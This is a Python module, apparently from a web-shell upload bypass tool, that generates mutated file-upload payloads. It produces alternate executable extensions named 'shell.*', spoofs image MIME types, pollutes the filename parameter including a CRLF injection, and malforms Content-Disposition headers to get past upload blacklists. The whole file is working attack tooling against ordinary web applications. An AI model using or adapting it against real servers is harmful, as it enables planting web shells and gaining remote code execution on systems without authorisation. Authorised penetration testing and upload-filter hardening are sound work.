#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
变异引擎 - v1.1.2

核心变异策略：
1. MIME伪造 - 修改Content-Type
2. 参数污染 - filename重复/畸形
3. CD头畸形 - Content-Disposition格式变异
4. 扩展名变异 - 针对黑名单绕过
"""

from typing import List, Dict, Any, Optional
from dataclasses import dataclass, field
import random


@dataclass
class MutationType:
    """变异类型常量"""
    EXTENSION = "extension"
    MIME_SPOOF = "mime_spoof"
    PARAM_POLLUTION = "param_pollution"
    CD_MALFORM = "cd_malform"


@dataclass
class MutatedPayload:
    """变异后的Payload"""
    original_ext: str
    mutated_ext: str
    filename: str
    content: bytes
    content_type: str
    mutation_type: str
    mutation_desc: str
    http_mods: Dict[str, Any] = field(default_factory=dict)
    confidence: float = 0.5

    def to_dict(self) -> Dict[str, Any]:
        """转换为字典格式"""
        return {
            'type': f"mutation_{self.mutation_type}",
            'ext': self.mutated_ext,
            'filename': self.filename,
            'content': self.content,
            'mime': self.content_type,
            'desc': self.mutation_desc,
            'http_mods': self.http_mods,
            'confidence': self.confidence,
        }


# ============================================================
# 扩展名变异
# ============================================================

class ExtensionMutator:
    """扩展名变异器"""

    # PHP环境扩展名
    PHP_EXTS = ['php5', 'phtml', 'pht', 'phps', 'php3', 'php4', 'php7', 'phar']

    # ASP/IIS环境扩展名
    ASP_EXTS = ['aspx', 'ashx', 'asmx', 'cer', 'asa']

    # JSP环境扩展名
    JSP_EXTS = ['jspx', 'jsw', 'jsv', 'jspf']

    @classmethod
    def mutate(cls, base_ext: str, target_env: str = 'php') -> List[MutatedPayload]:
        """生成扩展名变异"""
        results = []
        base_ext = base_ext.lower()

        # 选择扩展名池
        if target_env in ['asp', 'iis', 'windows']:
            ext_pool = cls.ASP_EXTS
        elif target_env in ['jsp', 'tomcat', 'java']:
            ext_pool = cls.JSP_EXTS
        else:
            ext_pool = cls.PHP_EXTS

        for ext in ext_pool:
            filename = f"shell.{ext}"
            results.append(MutatedPayload(
                original_ext=base_ext,
                mutated_ext=ext,
                filename=filename,
                content=b'',
                content_type='application/octet-stream',
                mutation_type=MutationType.EXTENSION,
                mutation_desc=f"扩展名变异: .{base_ext} -> .{ext}",
                confidence=0.7
            ))

        return results


# ============================================================
# MIME伪造
# ============================================================

class MimeTypeMutator:
    """MIME类型伪造器"""

    MIME_PAIRS = [
        ('image/jpeg', 'JPEG伪装'),
        ('image/png', 'PNG伪装'),
        ('image/gif', 'GIF伪装'),
        ('text/plain', '文本伪装'),
    ]

    @classmethod
    def mutate(cls, filename: str, base_ext: str) -> List[MutatedPayload]:
        """生成MIME伪造"""
        results = []
        ext = filename.split('.')[-1] if '.' in filename else base_ext

        for fake_mime, desc in cls.MIME_PAIRS:
            results.append(MutatedPayload(
                original_ext=ext,
                mutated_ext=ext,
                filename=filename,
                content=b'',
                content_type=fake_mime,
                mutation_type=MutationType.MIME_SPOOF,
                mutation_desc=f"MIME伪造: {desc}",
                http_mods={'fake_content_type': fake_mime},
                confidence=0.5
            ))

        return results


# ============================================================
# 参数污染
# ============================================================

class ParamPollutionMutator:
    """参数污染变异器"""

    PATTERNS = [
        ('{good}; filename="{bad}"', '分号污染'),
        ('{good}\r\nfilename="{bad}"', 'CRLF注入'),
    ]

    @classmethod
    def mutate(cls, good_filename: str, bad_filename: str) -> List[MutatedPayload]:
        """生成参数污染"""
        results = []
        bad_ext = bad_filename.split('.')[-1] if '.' in bad_filename else 'php'

        for pattern, desc in cls.PATTERNS:
            polluted = pattern.format(good=good_filename, bad=bad_filename)
            results.append(MutatedPayload(
                original_ext=bad_ext,
                mutated_ext=bad_ext,
                filename=bad_filename,
                content=b'',
                content_type='application/octet-stream',
                mutation_type=MutationType.PARAM_POLLUTION,
                mutation_desc=f"参数污染: {desc}",
                http_mods={'filename_field': polluted},
                confidence=0.4
            ))

        return results


# ============================================================
# CD头畸形
# ============================================================

class CDMalformMutator:
    """Content-Disposition畸形器"""

    PATTERNS = [
        ('filename= {fname}', '等号后空格'),
        ('filename="{fname}" ', '尾部空格'),
        ("filename='{fname}'", '单引号'),
    ]

    @classmethod
    def mutate(cls, filename: str) -> List[MutatedPayload]:
        """生成CD头畸形"""
        results = []
        ext = filename.split('.')[-1] if '.' in filename else 'php'

        for pattern, desc in cls.PATTERNS:
            cd_value = f'form-data; name="file"; {pattern.format(fname=filename)}'
            results.append(MutatedPayload(
                original_ext=ext,
                mutated_ext=ext,
                filename=filename,
                content=b'',
                content_type='application/octet-stream',
                mutation_type=MutationType.CD_MALFORM,
                mutation_desc=f"CD头畸形: {desc}",
                http_mods={'content_disposition': cd_value},
                confidence=0.3
            ))

        return results


# ============================================================
# 变异管道
# ============================================================

class MutationPipeline:
    """变异管道"""

    def __init__(self):
        self.stats = {'generated': 0}

    def process(self, base_payload: Dict[str, Any], target_env: str = 'php') -> List[MutatedPayload]:
        """
        处理基础payload，生成所有变异
        """
        results = []

        base_ext = base_payload.get('ext', 'php')
        filename = base_payload.get('filename', f"shell.{base_ext}")
        content = base_payload.get('content', b'')
        good_filename = base_payload.get('good_filename', 'shell.jpg')

        # 1. 扩展名变异
        for m in ExtensionMutator.mutate(base_ext, target_env):
            m.content = content
            results.append(m)

        # 2. MIME伪造
        for m in MimeTypeMutator.mutate(filename, base_ext):
            m.content = content
            results.append(m)

        # 3. 参数污染
        for m in ParamPollutionMutator.mutate(good_filename, filename):
            m.content = content
            results.append(m)

        # 4. CD头畸形
        for m in CDMalformMutator.mutate(filename):
            m.content = content
            results.append(m)

        self.stats['generated'] = len(results)
        return results


def create_targeted_payloads(base_code: bytes, target_env: str, lang: str = 'php') -> List[Dict]:
    """快速创建针对特定环境的payloads"""
    pipeline = MutationPipeline()

    base_payload = {
        'ext': lang,
        'filename': f'shell.{lang}',
        'content': base_code,
        'good_filename': 'shell.jpg',
    }

    mutations = pipeline.process(base_payload, target_env)
    return [m.to_dict() for m in mutations]
